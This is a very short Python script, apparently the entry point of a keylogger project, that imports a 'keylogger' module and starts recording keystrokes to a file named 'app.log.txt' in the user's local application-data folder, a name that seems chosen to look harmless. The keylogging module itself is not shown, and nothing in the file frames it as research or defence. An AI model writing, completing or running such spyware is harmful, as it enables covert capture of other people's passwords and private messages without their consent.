import os
from modules import keylogger

log_dir = os.environ['localappdata']
log_name = 'app.log.txt'

keylogger.get_keystrokes(log_dir, log_name)
